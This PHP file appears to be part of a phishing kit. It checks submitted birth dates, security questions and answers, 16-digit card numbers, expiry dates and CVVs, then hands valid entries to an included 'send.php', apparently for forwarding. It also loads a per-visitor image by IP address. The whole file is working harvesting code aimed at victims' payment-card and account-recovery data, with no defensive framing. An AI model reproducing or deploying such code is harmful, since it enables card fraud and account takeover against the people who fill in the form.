<?php
if($_POST[set] == "ok"){
$error = "0";
$src = $_POST[image];
if(strlen($_POST[Bday]) !== 2 or $_POST[Bday] > 31){
$StyleBday = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(strlen($_POST[Bmoth]) !== 2 or $_POST[Bmoth] > 12){
$StyleBmoth = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(strlen($_POST[Byear]) !== 4 or $_POST[Byear] > 2000){
$StyleByear = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(empty($_POST[Question1])){
$StyleQuestion1 = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(empty($_POST[Reponse1])){
$StyleReponse1 = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(empty($_POST[Question2]) or $_POST[Question1] == $_POST[Question2]){
$StyleQuestion2 = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(empty($_POST[Reponse2]) or $_POST[Reponse1] == $_POST[Reponse2]){
$StyleReponse2 = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(strlen($_POST[Ncarte]) !== 16){
$StyleNcarte = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(empty($_POST[Exmoth])){
$StyleExmoth = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if($_POST[Exmoth] < gmdate("m") and $_POST[Exyear] == gmdate("Y")){
$StyleExmoth = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(empty($_POST[Exyear])){
$StyleExyear = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(strlen($_POST[Cvv]) !== 3){
$StyleCvv = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if($error == "0"){
include "send.php";
exit;
}
}else{
$ip = getenv("REMOTE_ADDR");
$str = file_get_contents("data_img/$ip.png");
$imageData = base64_encode($str);
$src = 'data:image/png;base64,'.$imageData;
}
?>